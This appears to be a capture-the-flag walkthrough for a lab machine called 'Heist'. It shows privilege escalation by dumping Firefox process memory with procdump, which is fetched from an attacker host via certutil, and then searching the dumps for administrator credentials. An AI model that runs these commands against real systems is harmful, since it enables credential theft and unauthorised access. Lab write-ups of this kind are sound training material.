# Privilege escalation to Administrator
## Firefox Credential files found 
Firefox Credential file found in  `C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles\77nc64t5.default\key4.db`, which indicates that firefox process is owned by user `chase` and some  credentials in memory can be dumped via from firefox process.
![[Pasted image 20210712100645.png]]
## Firefox process found in processes list
Issuing command `Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id` gave list of processes which included `firefox`.
![[Pasted image 20210712101521.png]]
## Getting memory dump of firefox processes via procdump utility
Transferred `procdump.exe` file to `Heist` machine using `Certutil` utility and command `certutil.exe -urlcache -f http://10.10.14.71:8000/procdump.exe procdump.exe`.
![[Pasted image 20210712104544.png]]
Knowing PID of firefox processes.
![[Pasted image 20210712104744.png]]
Dumping contents of all firefox processes using `.\procdump.exe -ma [PID]` command.
![[Pasted image 20210712105452.png]]
## Getting administrator credentials from dumps
Getting administrator credentials from dumps using `Select-String -Path .\*.dmp -Pattern 'username'` . `Select-String` in windows is like `grep` of linux.
![[Pasted image 20210712110518.png]]
## Logging in with credentials got above as administrator
Logging in with credentials got above as administrator.
![[Pasted image 20210712110655.png]]

